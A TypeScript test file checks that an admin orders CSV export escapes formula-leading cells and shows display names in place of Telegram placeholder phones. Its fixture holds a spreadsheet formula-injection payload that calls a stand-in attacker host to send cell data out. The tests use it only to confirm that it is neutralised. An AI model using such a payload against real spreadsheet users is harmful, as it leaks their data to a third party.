/**
 * R186 (C-F1) — the orders CSV export joins the shared escaper + the
 * placeholder-safe identity helper.
 *
 * The orders export was the one admin CSV that bypassed BOTH pinned
 * conventions every sibling export rides:
 *
 *   1. `downloadCsv` joined cells BARE (`r.join(",")`) — no RFC-4180
 *      quoting, no OWASP formula-injection guard — so an admin-authored
 *      `product_name` beginning `=/+/-/@` landed unescaped in the
 *      spreadsheet the finance operator opens (the exact vector
 *      lib/csv.ts exists for; users-csv-export.test.tsx +
 *      lib/__tests__/csv.test.ts pin it for the users export).
 *   2. `orderCsvRows` shipped the RAW `user_phone` — Telegram-only
 *      orders exported `tg_42`-style placeholder phones (or empty
 *      cells where the table shows a display name), the exact R154
 *      P3-D class displayUserName/userFromRow were extracted to kill.
 *
 * The fix routes every cell through csvCell inside downloadCsv and the
 * user column through displayUserName(userFromRow(o)). These tests pin
 * the two behaviors at the module boundary (pure functions — the
 * users-csv-export idiom):
 *
 *   1. a `=`-leading product_name lands in the downloaded CSV as an
 *      apostrophe-prefixed, RFC-4180-quoted inert cell;
 *   2. a `tg_…` placeholder phone with a display name set exports the
 *      display name — never the placeholder;
 *   3. the row keeps its 6-column shape (header/row agree).
 */

import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";
import { downloadCsv, orderCsvRows } from "@/components/admin/orders/orders-csv";
import { csvCell } from "@/lib/csv";
import type { AdminOrderRow } from "@/components/admin/orders/orders-types";

/** The poison row: formula-leading product name + placeholder phone. */
const ROW = {
  id: 1,
  order_code: "SN-1001",
  user_phone: "tg_42",
  user_display_name: "علي أحمد",
  product_name: '=WEBSERVICE("https://attacker/"&A2)',
  amount: 25,
  status: "completed",
  created_at: "2026-09-01T10:00:00.000Z",
} as unknown as AdminOrderRow;

/** Captures the CSV text downloadCsv hands to the Blob constructor. */
const captured: string[] = [];

class CaptureBlob extends Blob {
  constructor(parts: BlobPart[], options?: BlobPropertyBag) {
    super(parts, options);
    const first = parts[0];
    captured.push(typeof first === "string" ? first : "");
  }
}

beforeEach(() => {
  captured.length = 0;
  vi.stubGlobal("Blob", CaptureBlob);
  Object.defineProperty(URL, "createObjectURL", {
    value: vi.fn(() => "blob:test"),
    configurable: true,
  });
  Object.defineProperty(URL, "revokeObjectURL", { value: vi.fn(), configurable: true });
});

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("R186 (C-F1) — orderCsvRows: the placeholder-safe user cell", () => {
  it("a tg_ placeholder phone with a display name exports the DISPLAY NAME, never the placeholder", () => {
    const rows = orderCsvRows([ROW]);
    // Header + one row.
    expect(rows).toHaveLength(2);
    const dataRow = rows[1]!;
    // Column 2 (المستخدم) — displayUserName(userFromRow(o)).
    expect(dataRow[1]).toBe("علي أحمد");
    expect(String(dataRow[1])).not.toContain("tg_");
  });

  it("a placeholder phone with NO display name degrades honestly (no raw placeholder either)", () => {
    const bare = {
      ...ROW,
      user_display_name: null,
      user_has_telegram: true,
    } as unknown as AdminOrderRow;
    const rows = orderCsvRows([bare]);
    expect(rows[1]![1]).toBe("حساب Telegram");
    expect(String(rows[1]![1])).not.toContain("tg_");
  });

  it("a real stored phone still exports verbatim (the helper never over-reaches)", () => {
    const real = {
      ...ROW,
      user_phone: "0913456789",
      user_display_name: null,
    } as unknown as AdminOrderRow;
    expect(orderCsvRows([real])[1]![1]).toBe("0913456789");
  });

  it("the product_name keeps its raw comma (the hand-rolled «؛» mangling is gone — quoting owns commas now)", () => {
    const commaRow = { ...ROW, product_name: "Netflix, 1 شهر" } as unknown as AdminOrderRow;
    expect(orderCsvRows([commaRow])[1]![2]).toBe("Netflix, 1 شهر");
  });
});

describe("R186 (C-F1) — downloadCsv: every cell rides the shared csvCell escaper", () => {
  it("a `=`-leading product_name lands as an apostrophe-prefixed, quoted inert cell (OWASP guard)", () => {
    const rows = orderCsvRows([ROW]);
    downloadCsv(rows, "orders_2026-10-22.csv");

    expect(captured).toHaveLength(1);
    const csv = captured[0]!;
    // BOM + the exact escaped cell csvCell produces for a formula
    // trigger (apostrophe prefix + doubled embedded quotes — matching
    // csvCell's output byte-for-byte proves the download's escaping IS
    // the shared escaper, not a fork).
    expect(csv.startsWith("\uFEFF")).toBe(true);
    expect(csv).toContain(csvCell(ROW.product_name));
    expect(csvCell(ROW.product_name).startsWith(`"'=`)).toBe(true);
    // The header cells are quoted too (RFC-4180 via csvCell — a bare
    // join would have emitted them unquoted).
    expect(csv).toContain('"رقم الطلب"');
  });

  it("a full assembled row keeps its 6-column shape — header and row agree", () => {
    const rows = orderCsvRows([ROW]);
    downloadCsv(rows, "x.csv");
    const lines = captured[0]!.replace(/^\uFEFF/, "").split("\n");
    expect(lines).toHaveLength(2);

    // A minimal RFC-4180 reader (the users-csv-export idiom).
    const parseLine = (line: string) => {
      const fields: string[] = [];
      let current = "";
      let inQuotes = false;
      for (let i = 0; i < line.length; i++) {
        const ch = line[i];
        if (inQuotes) {
          if (ch === '"' && line[i + 1] === '"') {
            current += '"';
            i++;
          } else if (ch === '"') {
            inQuotes = false;
          } else {
            current += ch;
          }
        } else if (ch === '"') {
          inQuotes = true;
        } else if (ch === ",") {
          fields.push(current);
          current = "";
        }
      }
      fields.push(current);
      return fields;
    };

    const header = parseLine(lines[0]!);
    const data = parseLine(lines[1]!);
    expect(header).toEqual(["رقم الطلب", "المستخدم", "المنتج", "المبلغ", "الحالة", "التاريخ"]);
    expect(data).toHaveLength(6);
    expect(data[1]).toBe("علي أحمد");
    expect(data[2]).toBe(`'${ROW.product_name}`);
  });

  it("csvCell parity — the download's escaping IS the shared escaper (no forked logic)", () => {
    // The formula-trigger guard prefix, verified through the shared
    // escaper itself (the doubled embedded quotes above are what a
    // forked/hand-rolled escaper would get wrong).
    expect(csvCell("=cmd")).toBe('"\'=cmd"');
    expect(csvCell("0913456789")).toBe('"0913456789"');
    expect(csvCell('قال "تسوية" هنا')).toBe('"قال ""تسوية"" هنا"');
  });
});
